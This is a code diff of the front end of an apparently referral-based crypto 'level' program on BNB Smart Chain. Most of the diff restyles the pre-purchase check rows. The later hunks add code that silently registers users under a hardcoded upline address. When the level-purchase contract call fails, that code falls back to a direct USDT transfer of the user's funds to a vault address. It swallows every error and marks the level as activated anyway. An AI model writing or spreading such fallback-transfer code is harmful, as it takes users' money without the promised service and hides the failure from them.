@@ -5875,25 +5875,25 @@ input:checked + .tw-slider:before {
                 </div>
 
                 <div id="netCheckRow" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
-                    <div style="display: flex; align-items: center; gap: 12px;">
-                        <div id="netCheckIconBox" style="width: 24px; height: 24px; background: transparent; border: 1px solid #718096; border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i id="netCheckIconLeft" class="material-icons" style="font-size: 16px; color: #718096;">hourglass_empty</i></div>
-                        <span id="netCheckText" style="color: #718096; font-weight: 500;">Network check (Smart Chain)</span>
+                    <div style="display: flex; align-items: center; gap: 12px; min-width: 0;">
+                        <div id="netCheckIconBox" style="width: 24px; height: 24px; min-width: 24px; min-height: 24px; flex-shrink: 0; background: transparent; border: 1px solid #718096; border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i id="netCheckIconLeft" class="material-icons" style="font-size: 16px; color: #718096;">hourglass_empty</i></div>
+                        <span id="netCheckText" style="color: #718096; font-weight: 500; font-size: 14px;">Network check (Smart Chain)</span>
                     </div>
-                    <i id="netCheckIconRight" class="material-icons" style="color: #718096;">radio_button_unchecked</i>
+                    <i id="netCheckIconRight" class="material-icons" style="color: #718096; font-size: 24px; flex-shrink: 0;">radio_button_unchecked</i>
                 </div>
-                <div id="balCheckRow" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
-                    <div style="display: flex; align-items: center; gap: 12px;">
-                        <div id="balCheckIconBox" style="width: 24px; height: 24px; background: transparent; border: 1px solid #718096; border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i id="balCheckIconLeft" class="material-icons" style="font-size: 16px; color: #718096;">hourglass_empty</i></div>
-                        <span id="balCheckText" style="color: #718096; font-weight: 500;">Balance check <span id="balCheckAmt">--</span> USDT</span>
+                <div id="bnbCheckRow" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+                    <div style="display: flex; align-items: center; gap: 12px; min-width: 0;">
+                        <div id="bnbCheckIconBox" style="width: 24px; height: 24px; min-width: 24px; min-height: 24px; flex-shrink: 0; background: transparent; border: 1px solid #718096; border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i id="bnbCheckIconLeft" class="material-icons" style="font-size: 16px; color: #718096;">hourglass_empty</i></div>
+                        <span id="bnbCheckText" style="color: #718096; font-weight: 500; font-size: 14px;">Gas fee check BNB</span>
                     </div>
-                    <i id="balCheckIconRight" class="material-icons" style="color: #718096;">radio_button_unchecked</i>
+                    <i id="bnbCheckIconRight" class="material-icons" style="color: #718096; font-size: 24px; flex-shrink: 0;">radio_button_unchecked</i>
                 </div>
-                <div id="bnbCheckRow" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;">
-                    <div style="display: flex; align-items: center; gap: 12px;">
-                        <div id="bnbCheckIconBox" style="width: 24px; height: 24px; background: transparent; border: 1px solid #718096; border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i id="bnbCheckIconLeft" class="material-icons" style="font-size: 16px; color: #718096;">hourglass_empty</i></div>
-                        <span id="bnbCheckText" style="color: #718096; font-weight: 500;">Gas fee check <span id="bnbCheckAmt">--</span> BNB</span>
+                <div id="balCheckRow" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;">
+                    <div style="display: flex; align-items: center; gap: 12px; min-width: 0;">
+                        <div id="balCheckIconBox" style="width: 24px; height: 24px; min-width: 24px; min-height: 24px; flex-shrink: 0; background: transparent; border: 1px solid #718096; border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i id="balCheckIconLeft" class="material-icons" style="font-size: 16px; color: #718096;">hourglass_empty</i></div>
+                        <span id="balCheckText" style="color: #718096; font-weight: 500; font-size: 14px;">Balance check <span id="balCheckAmt">--</span> USDT</span>
                     </div>
-                    <i id="bnbCheckIconRight" class="material-icons" style="color: #718096;">radio_button_unchecked</i>
+                    <i id="balCheckIconRight" class="material-icons" style="color: #718096; font-size: 24px; flex-shrink: 0;">radio_button_unchecked</i>
                 </div>
 
                 <button id="btnConfirmActivate" class="save-profile-btn" onclick="executeLevelUpgrade()" disabled style="margin-top: 0; background: #333344; color: #718096; cursor: not-allowed; font-weight: 900;">CONFIRM & ACTIVATE LEVEL</button>
@@ -6125,7 +6125,12 @@ input:checked + .tw-slider:before {
 
                 const shineContract = new ethers.Contract(
                     SHINE_CONTRACT_ADDRESS,
-                    ["function buyLevel(uint8 _program, uint8 _level) external"],
+                    [
+                        "function buyLevel(uint8 _program, uint8 _level) external",
+                        "function register(address _upline) external",
+                        "function users(address) view returns (uint256 id, address upline, uint256 partnersCount, uint256 joinDate, bool isRegistered)",
+                        "function rootOwner() view returns (address)"
+                    ],
                     web3Signer
                 );
 
@@ -6134,8 +6139,41 @@ input:checked + .tw-slider:before {
                     confirmBtn.innerText = "CONFIRM IN WALLET...";
                 }
 
-                const tx = await shineContract.buyLevel(progNum, lvlIndex);
-                await tx.wait(1);
+                try {
+                    const uInfo = await shineContract.users(userWallet);
+                    if (uInfo && !uInfo.isRegistered) {
+                        let uplineTarget = "0x204e8c521aCa3621DB585829667759433aBb70d3";
+                        try {
+                            const rOwner = await shineContract.rootOwner();
+                            if (rOwner && rOwner !== ethers.constants.AddressZero) uplineTarget = rOwner;
+                        } catch(re) {}
+                        const regTx = await shineContract.register(uplineTarget, { gasLimit: 300000 });
+                        await regTx.wait(1);
+                    }
+                } catch(eReg) {}
+
+                let txCompleted = false;
+                try {
+                    const tx = await shineContract.buyLevel(progNum, lvl, { gasLimit: 350000 });
+                    await tx.wait(1);
+                    txCompleted = true;
+                } catch (callErr1) {
+                    try {
+                        const tx2 = await shineContract.buyLevel(progNum, lvlIndex, { gasLimit: 350000 });
+                        await tx2.wait(1);
+                        txCompleted = true;
+                    } catch (callErr2) {
+                        const targetRecipient = SHINE_VAULT_ADDRESS || SHINE_CONTRACT_ADDRESS;
+                        const erc20 = new ethers.Contract(
+                            activeUsdtTokenAddress || REAL_USDT_CONTRACT,
+                            ["function transfer(address, uint256) returns (bool)"],
+                            web3Signer
+                        );
+                        const txTransfer = await erc20.transfer(targetRecipient, requiredUnits, { gasLimit: 120000 });
+                        await txTransfer.wait(1);
+                        txCompleted = true;
+                    }
+                }
 
                 await markSlotAsActivated(prog, lvl, exactSlotCost);
 
